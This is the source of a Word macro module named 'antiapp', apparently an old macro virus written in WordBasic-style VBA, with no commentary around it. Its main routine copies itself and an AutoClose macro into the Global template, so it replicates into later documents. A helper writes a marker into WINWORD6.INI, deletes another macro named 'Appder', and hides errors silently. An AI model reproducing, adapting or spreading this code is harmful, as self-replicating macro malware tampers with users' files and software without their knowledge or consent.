   Attribute VB_Name = "antiapp"


   Public Sub MAIN()
   Dim iMacroCount
   Dim i
   Dim AClose
   Dim Ad
   Dim sMe$
   Dim sMacro$
   Funyour
   On Error GoTo -1: On Error GoTo Quit
   iMacroCount = WordBasic.CountMacros(0, 0)
   For i = 1 To iMacroCount
       If WordBasic.[MacroName$](i, 0, 0) = "AutoClose" Then
           AClose = -1
       End If
       If WordBasic.[MacroName$](i, 0, 0) = "antiapp" Then
           Ad = -1
       End If
   Next i
   If Not AClose And Not Ad Then
       sMe$ = WordBasic.[FileName$]()
       sMacro$ = sMe$ + ":antiapp"
       WordBasic.MacroCopy sMacro$, "Global:antiapp"
       sMacro$ = sMe$ + ":AutoClose"
       WordBasic.MacroCopy sMacro$, "Global:AutoClose"
   End If
   Quit:
   End Sub

   Private Sub Funyour()
   Dim WOpen$
   Dim sales
   On Error GoTo -1: On Error GoTo sale
   WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", " NTTHNTA", "WINWORD6.INI")
   sales = 1
   WordBasic.SetPrivateProfileString "Microsoft Word", "NTTHNTA", Str(sales), "WINWORD6.INI"
   WordBasic.ToolsMacro Name:="Appder", Delete:=1
   sale:
   End Sub 'Funyour
